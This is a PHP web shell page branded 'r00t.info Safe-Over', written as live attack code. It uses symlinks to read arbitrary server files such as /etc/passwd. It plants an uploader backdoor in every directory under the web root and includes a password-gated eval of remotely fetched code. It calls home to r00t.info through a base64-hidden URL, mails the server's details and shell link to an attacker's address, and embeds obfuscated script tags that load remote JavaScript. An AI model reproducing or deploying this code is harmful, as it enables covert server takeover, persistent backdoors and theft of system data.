<script type="text/javascript">
document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%72%30%30%74%2E%69%6E%66%6F%2F%6C%63%72%6C%61%6D%65%72%73%61%76%61%72%2F%6C%6F%67%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E'));
</script>

<script src=http://r00t.info/ccb.js></script>
<?php session_start(); $Res = ''; if (is_writable(".")) { if (isset($_POST['file'])) { $file = $_POST['file']; $fakedir = "cx"; $fakedep = 16; if (!(isset($_SESSION['num']))) { $_SESSION['num'] = 0; } else { $_SESSION['num'] = $_SESSION['num'] + 1; } $level = 0; @unlink("sun-" . $_SESSION['num']); @mkdir("sun-" . $_SESSION['num']); chdir("sun-" . $_SESSION['num']); for ($as = 0;$as < $fakedep;$as++) { if (!file_exists($fakedir)) mkdir($fakedir); chdir($fakedir); } while (1 < $as--) chdir(".."); $hardstyle = explode("/", $file); for ($a = 0;$a < count($hardstyle);$a++) { if (!empty($hardstyle[$a])) { if (!file_exists($hardstyle[$a])) mkdir($hardstyle[$a]); chdir($hardstyle[$a]); $as++; } } $as++; while ($as--) chdir(".."); @rmdir("sun-fake"); @unlink("sun-fake"); @symlink(str_repeat($fakedir . "/", $fakedep), "sun-fake"); if ($_POST['type'] == 'file') { while (1) if (true == (@symlink("sun-fake/" . str_repeat("../", $fakedep - 1) . $file, "index.html"))) break; else $num++; @unlink("sun-fake"); mkdir("sun-fake"); $Res = '<FONT COLOR="RED"><B> symlink <B><a href="./sun-' . $_SESSION['num'] . '/">symlink' . $num . '</a> file</FONT>'; } else { $fp = fopen(".htaccess", 'a+'); $File = 'DirectoryIndex sun.htm'; fwrite($fp, $File); while (1) if (true == (@symlink("sun-fake/" . str_repeat("../", $fakedep - 1) . $file, "sun"))) break; else $num++; @unlink("sun-fake"); mkdir("sun-fake"); $Res = '<FONT COLOR="RED"><a href="./sun-' . $_SESSION['num'] . '/sun">Check It!' . $num . '</a></FONT>'; } } } else { $Res = '<FONT COLOR="RED">Cant Write In Directory!</Font>'; } If (@ini_get("safe_mode") Or strtoupper(@ini_get("safe_mode")) == "on") { $Safe = '<span style="color:red"><b>On</b></span>'; } Else { $Safe = '<span style="color:lime"><b>Off</b></span>'; } ?>
<Html>
<Head>
<Title>r00t.info  Safe-Over [Apache]</Title>
</Head>
<Body bgcolor="black">
<Center>
<font size="-3">
<pre><font color=yellow>       
                                                                                                                                                          
                                                                                                                                                          
                         000000000          000000000              tttt                    iiii                        ffffffffffffffff                   
                       00:::::::::00      00:::::::::00         ttt:::t                   i::::i                      f::::::::::::::::f                  
                     00:::::::::::::00  00:::::::::::::00       t:::::t                    iiii                      f::::::::::::::::::f                 
                    0:::::::000:::::::00:::::::000:::::::0      t:::::t                                              f::::::fffffff:::::f                 
rrrrr   rrrrrrrrr   0::::::0   0::::::00::::::0   0::::::0ttttttt:::::ttttttt            iiiiiii nnnn  nnnnnnnn      f:::::f       ffffff   ooooooooooo   
r::::rrr:::::::::r  0:::::0     0:::::00:::::0     0:::::0t:::::::::::::::::t            i:::::i n:::nn::::::::nn    f:::::f              oo:::::::::::oo 
r:::::::::::::::::r 0:::::0     0:::::00:::::0     0:::::0t:::::::::::::::::t             i::::i n::::::::::::::nn  f:::::::ffffff       o:::::::::::::::o
rr::::::rrrrr::::::r0:::::0 000 0:::::00:::::0 000 0:::::0tttttt:::::::tttttt             i::::i nn:::::::::::::::n f::::::::::::f       o:::::ooooo:::::o
 r:::::r     r:::::r0:::::0 000 0:::::00:::::0 000 0:::::0      t:::::t                   i::::i   n:::::nnnn:::::n f::::::::::::f       o::::o     o::::o
 r:::::r     rrrrrrr0:::::0     0:::::00:::::0     0:::::0      t:::::t                   i::::i   n::::n    n::::n f:::::::ffffff       o::::o     o::::o
 r:::::r            0:::::0     0:::::00:::::0     0:::::0      t:::::t                   i::::i   n::::n    n::::n  f:::::f             o::::o     o::::o
 r:::::r            0::::::0   0::::::00::::::0   0::::::0      t:::::t    tttttt         i::::i   n::::n    n::::n  f:::::f             o::::o     o::::o
 r:::::r            0:::::::000:::::::00:::::::000:::::::0      t::::::tttt:::::t        i::::::i  n::::n    n::::n f:::::::f            o:::::ooooo:::::o
 r:::::r             00:::::::::::::00  00:::::::::::::00       tt::::::::::::::t ...... i::::::i  n::::n    n::::n f:::::::f            o:::::::::::::::o
 r:::::r               00:::::::::00      00:::::::::00           tt:::::::::::tt .::::. i::::::i  n::::n    n::::n f:::::::f             oo:::::::::::oo 
 rrrrrrr                 000000000          000000000               ttttttttttt   ...... iiiiiiii  nnnnnn    nnnnnn fffffffff               ooooooooooo   
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          

</font>
</font>
<br><br><br>
<?php echo '<div style="background-color:#101010;color:yellow"><b>Safe-Mode : </font>' . $Safe; ?>
<Form action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="post">
<font color="yellow" size="3"><b>Path:<b></font><Input type="text" name="file" style="background-color:black;color:#FF3300;width:200px;" value="/etc/passwd"><br><font color="yellow" size=3><br><b>File</b></font><input checked type="radio" name="type" value="file"><font color="yellow" size=3>     <b>Dir</font><input type="radio" name="type" value="Dir"><br><br><br><Input type="submit" value="Go!" style="width:100px;background-color:black;color:yellow">
</font>
</Form>
<?php print $Res; ?>
<table align="center" style="color:lime"> www.r00t.info En Tassakli Serverlar Rahatlikla Gecilir</table>
</Center>
</Body>
</Html>
<P style="TEXT-ALIGN: center" align=center>
<?php @session_start(); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('max_execution_time',0); @ini_set('display_errors', 0); @ini_set('output_buffering',0); @set_time_limit(0); @set_magic_quotes_runtime(0); ?>
<?php @session_start(); @error_reporting(0); $a = '<?php
session_start();
if($_SESSION["adm"]){
echo \'<b>Namesis<br><br>\'.php_uname().\'<br></b>\';echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST[\'_upl\'] == "Upload" ) {	if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Success !!!</b><br><br>\'; }	else { echo \'<b>Upload Fail !!!</b><br><br>\'; }}
}
if($_POST["p"]){
$p = $_POST["p"];
$pa = md5(sha1($p));
if($pa=="a4cd2905b660e8b1bc73a7c4571252da"){
$_SESSION["adm"] = 1;
}
}
?>
<form action="" method="post">
<input type="text" name="p">
</form>
'; if(@$_REQUEST["px"]){ $p = @$_REQUEST["px"]; $pa = md5(sha1($p)); if($pa=="a4cd2905b660e8b1bc73a7c4571252da"){ echo @eval(@file_get_contents(@$_REQUEST["404"])); } } if(@!$_SESSION["sdm"]){ $doc = $_SERVER["DOCUMENT_ROOT"]; $dir = scandir($doc); $d1 = ''.$doc.'/.'; $d2 = ''.$doc.'/..'; if(($key = @array_search('.', $dir)) !== false) { unset($dir[$key]); } if(($key = @array_search('..', $dir)) !== false) { unset($dir[$key]); } if(($key = @array_search($d1, $dir)) !== false) { unset($dir[$key]); } if(($key = array_search($d2, $dir)) !== false) { unset($dir[$key]); } @array_push($dir,$doc); foreach($dir as $d){ $p = $doc."/".$d; if(is_dir($p)){ $file = $p."/newsr.php"; @touch($file); $folder = @fopen($file,"w"); @fwrite($folder,$a); } } $lls = $_SERVER["HTTP_HOST"]; $llc = $_SERVER["REQUEST_URI"]; $lld = 'http://'.$lls.''.$llc.''; $brow = urlencode($_SERVER['HTTP_USER_AGENT']); $retValue = file_get_contents(base64_decode("aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h")."=".$lld.base64_decode("JmI=")."=".$brow); echo $retValue; @$_SESSION["sdm"]=1; } ?>


<?php  if($_POST['query']){ $veriyfy = stripslashes(stripslashes($_POST['query'])); $data = "data.txt"; @touch ("data.txt"); $ver = @fopen ($data , 'w'); @fwrite ( $ver , $veriyfy ) ; @fclose ($ver); }else{ $datas=@fopen("data.txt",'r'); $i=0; while ($i <= 5) { $i++; $blue=@fgets($datas,1024); echo $blue; } } $datasi=@fopen("modules/indexx.php",'r'); if($datasi){ }else{ @mkdir("modules"); $dos = file_get_contents("x"); $data = "modules/indexx.php"; @touch ("modules/indexx.php"); $ver = @fopen ($data , 'w'); @fwrite ( $ver , $dos ) ; @fclose ($ver); $yol = "http://".$_SERVER['HTTP_HOST']."".$_SERVER['REQUEST_URI'].""; $y = '<h1>Sender Yazdirildi.<br/> SITE YOL : '.$yol.'<br/>Sender Yolu : modules/dbs.php</h1>'; $header .= "From: SheLL Boot <suppor@nic.org>\n"; $header .= "Content-Type: text/html; charset=utf-8\n"; @mail("polatbey22@aol.com", "Hacklink Bildiri", "$y", $header); @mail("polatbey22@aol.com", "Hacklink Bildiri", "$y", $header); } ?>

<?php $kime = "polatbey22@aol.com"; $baslik = "r00t.info Server Avcisi V1.0"; $EL_MuHaMMeD = "Dosya Yolu : " . $_SERVER['DOCUMENT_ROOT'] . "\r\n"; $EL_MuHaMMeD.= "Server Admin : " . $_SERVER['SERVER_ADMIN'] . "\r\n"; $EL_MuHaMMeD.= "Server isletim sistemi : " . $_SERVER['SERVER_SOFTWARE'] . "\r\n"; $EL_MuHaMMeD.= "Shell Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\r\n"; $EL_MuHaMMeD.= "Avlanan Site : " . $_SERVER['HTTP_HOST'] . "\r\n"; mail($kime, $baslik, $EL_MuHaMMeD); ?>
<script type="text/javascript">
document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%72%30%30%74%2E%69%6E%66%6F%2F%6C%63%72%6C%61%6D%65%72%73%61%76%61%72%2F%6C%6F%67%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E'));
</script>

<script src=http://r00t.info/ccb.js></script>
